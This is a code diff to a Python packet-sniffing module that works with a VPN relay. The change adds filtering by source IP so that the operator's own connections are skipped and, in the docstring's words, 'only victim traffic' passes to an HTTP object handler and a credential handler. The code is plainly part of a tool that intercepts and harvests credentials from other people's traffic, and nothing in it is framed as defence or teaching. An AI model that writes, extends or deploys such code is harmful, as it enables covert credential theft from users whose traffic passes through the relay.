@@ -402,14 +402,23 @@ def packet_handler(pkt):
 
 # ── Unified sniff loop (called by vpn_relay.py) ────────────────────────────────
 
-def sniff_loop(iface=None) -> None:
-    """
-    Dispatch every packet through both the HTTP object handler (server→client)
-    and the credential handler (client→server).
+def sniff_loop(iface=None, exclude_src_ips=None) -> None:
+    """Sniff HTTP traffic, dispatching to the object handler and credential handler.
 
-    Called by vpn_relay.py; the __main__ block below remains standalone-compatible.
+    exclude_src_ips: set/list of IP strings to ignore as traffic sources.
+    Pass our own interface IPs here so we don't log our own connections — only
+    victim traffic (forwarded packets with a foreign source IP) is reported.
+
+    Victim traffic identification: forwarded packets have src IP != any of our
+    own IPs.  Check pkt[IP].src not in exclude_src_ips before processing.
     """
+    exclude = set(exclude_src_ips or [])
+
     def _dispatch(pkt):
+        if IP not in pkt:
+            return
+        if exclude and pkt[IP].src in exclude:
+            return  # skip our own locally-generated connections
         packet_handler(pkt)
         cred_handler(pkt)
 
